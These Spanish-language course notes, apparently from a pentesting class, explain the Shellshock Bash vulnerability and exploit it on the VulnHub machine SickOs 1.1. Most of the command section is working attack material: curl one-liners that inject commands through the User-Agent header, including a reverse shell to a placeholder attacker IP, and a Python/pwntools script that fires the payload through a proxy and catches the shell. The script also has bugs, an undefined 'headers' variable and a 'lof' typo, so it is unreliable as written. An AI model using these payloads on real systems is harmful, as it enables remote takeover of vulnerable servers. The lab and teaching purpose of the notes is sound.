# Ataque ShellShock

Tags: #ShellShock #OWASP #Explotacion 

Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

A continuación se proporciona el enlace directo para la descarga de la máquina ‘**SickOs 1.1**‘. Esta máquina corresponde a la misma que estuvimos enumerando en la clase anterior, solo que en este caso procederemos con la fase de explotación haciendo uso de esta técnica:

-   **SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)


## Comandos

Si encontramos un dir llamado **/cgi-bin/** lo mas probables es que podamos testear un ShellShock. 
En esos directorios debemos de buscar archivos **pl, sh, cgi,** asi como tambien sin extension. 

* [ShellShock-Attack](https://blog.cloudflare.com/inside-shellshock/)

```bash 
curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; /usr/bin/whoami" 

	# s = Silence 
	# H = Cabecera para el ataque de ShellShock
	# Ruta absoluta del comando que quieres ejecutar y lo ves con 'which' -> which whoami


# Si al momento de ejecutar el comando anterior no nos reporta el comando, debemos de colocar un echo antes o hasta dos antes.
curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; echo; /usr/bin/id" 

	# Podemos colocar la ruta de cualquier comando, esperando a que la maquina tenga ese comando instalado. 


# Podemos usar el ShellShock para ganar acceso a la maquina.
curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 

	# Otra ruta del bash por si no funciona es '/usr/bin/bash' 
```


Haremos que al momento de ejecutar el programa, podamos tener una ReverShell al instante en nuestra consola.
```python
# Primero nos debemos crear un archivo python 

❯ nvim ShellShock.py

#!/usr/bin/python3

import requests
import signal
import sys
import threading 
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.68.1:3128'}
lport = 443

def shellshock_attack():
	header = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'"}
	r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':
	try:
		threading.Thread(target=shellshock_attack, args=()).start()
	except Exception as e:
		log.error(str(e))
	
	shell = listen(lport, timeout=20).wait_for_connection()
	
	if shell.sock is None:
		lof.failure("No se pudo establecer la conexion")
		sys.exit(1)
	else: 
		shell.interactive()
```